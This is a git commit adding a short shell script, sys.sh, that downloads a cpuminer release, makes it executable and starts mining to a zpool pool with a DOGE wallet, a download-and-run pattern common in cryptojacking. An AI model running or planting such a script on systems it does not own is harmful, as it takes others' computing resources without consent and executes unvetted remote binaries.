f26e08e8bdf9005200c0414ec08ce8122a1ea9bd
ahthis214 <86295800+ahthis214@users.noreply.github.com>
2024-11-04 19:15:12 +0700

    Create sys.sh

---
+++ sys.sh
@@ -0,0 +1,4 @@
+wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.36/cpuminer-opt-linux.tar.gz
+tar xf cpuminer-opt-linux.tar.gz
+chmod +x *
+./cpuminer-avx -a minotaurx -o stratum+tcp://minotaurx.na.mine.zpool.ca:7019 -u DApy2GXxV1d3WJExbGL8uTDG6LuoM833C4 -p c=DOGE
